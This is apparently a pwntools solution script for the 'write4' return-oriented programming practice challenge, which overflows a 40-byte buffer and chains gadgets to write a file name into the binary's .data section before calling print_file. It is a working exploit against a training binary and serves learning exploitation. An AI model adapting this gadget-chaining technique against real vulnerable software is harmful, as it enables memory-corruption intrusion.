from pwn import *

context.arch = "amd64"

elf = context.binary = ELF("./write4")

# address of our data section; store this in r14
DATA_PTR = 0x601028
PRINTFILE = p64(elf.symbols.print_file)
# file to read; store this in r15
# FLAG_PATH = b'flag.txt'

# our flag path. since it's longer than 8 bytes, break it into two.
FLAG_PATH_1 = b'long_nam'
# zero-pad it so it gets recognized as a null-terminated string.
FLAG_PATH_2 = b'e_file\x00\x00'

# get the address offset from .data by <offset> bytes
def get_data_offset(offset):
    return p64(DATA_PTR + offset)

# mov qword ptr [r14], r15; ret
MOV_DATA_GADGET = p64(0x400628)
# pop r14; pop r15; ret
POP_R14_R15_GADGET = p64(0x400690)
# pop rdi; ret
POP_RDI_GADGET = p64(0x400693)

payload = b'A' * 40

#! first move of data
# set up for jump to pop r14, then r15
payload += POP_R14_R15_GADGET
# first pop r14
payload += get_data_offset(0)
# then pop r15 (first half of name)
payload += FLAG_PATH_1
# ret to move data
payload += MOV_DATA_GADGET

#! second move of data
# ret back to pop r14, r15
payload += POP_R14_R15_GADGET
# pop r14 to point to .data + 8
payload += get_data_offset(8)
# pop r15 (second half of name)
payload += FLAG_PATH_2
# ret to move data
payload += MOV_DATA_GADGET

#! setup for print_file call
# ret to pop rdi
payload += POP_RDI_GADGET
# pop address of data into rdi
payload += get_data_offset(0)
# ret to print_file
payload += PRINTFILE

conn = process("./write4")
conn.recvuntil(b'> ')
conn.send(payload)

recved = conn.recvall()
print(recved.decode("ascii"))

# import sys
# sys.stdout.buffer.write(payload)
